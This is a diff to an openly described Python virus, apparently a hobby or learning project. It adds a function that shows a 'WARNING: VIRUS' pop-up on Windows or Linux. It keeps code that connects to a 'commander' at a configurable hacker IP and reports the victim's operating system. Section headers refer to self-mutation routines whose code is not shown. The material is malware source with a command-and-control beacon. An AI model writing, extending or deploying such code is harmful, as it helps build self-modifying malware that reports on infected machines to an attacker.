@@ -2,13 +2,27 @@ import socket
 import sys
 import time
 import platform
+import ctypes
+import subprocess
 
 # ----------- Variables -----------
 host = '127.0.0.1' #Hacker's IP address as a string
 port = 9999
-target_os = platform.system()
+target_os = None
+infection_message = "You've been infected!!"
 
 # ----------- Functions ----------- 
+
+# -- Infection Message -- 
+
+def post_infection_msg(target_os, infection_msg):
+    print(target_os)
+    msg_box_title = "WARNING: VIRUS"
+
+    if target_os == 'Windows':
+        ctypes.windll.user32.MessageBoxW(0, infection_msg, msg_box_title, 1)
+    else:
+        subprocess.run(['notify-send', msg_box_title, infection_msg])
 
 # -- Self Mutation Functions -- 
 #region
@@ -75,7 +89,6 @@ def swap_variables(code):
 function: send_data
 
 A wrapper for socket.send() which encodes automatically in utf-8.
-
 """
 def send_data(s, data):
     s.send(f"{data}".encode('utf-8'))
@@ -85,20 +98,16 @@ def send_data(s, data):
 # ----------- Main Operations ----------- 
 
 # (1) Retrieve host OS information.
-
+target_os = platform.system()
 
 # (2) Establish connection with commander.
 s = socket.socket()
 s.connect((host, port))
 
-s.send("Hello Command!\n".encode('utf-8'))
-
-time.sleep(1)
-
 send_data(s, f"Target OS: '{str(target_os)}'")
 
 # (3) Send infection message.
-
+post_infection_msg(target_os, infection_message)
 
 # (4) Perform self mutations.
 
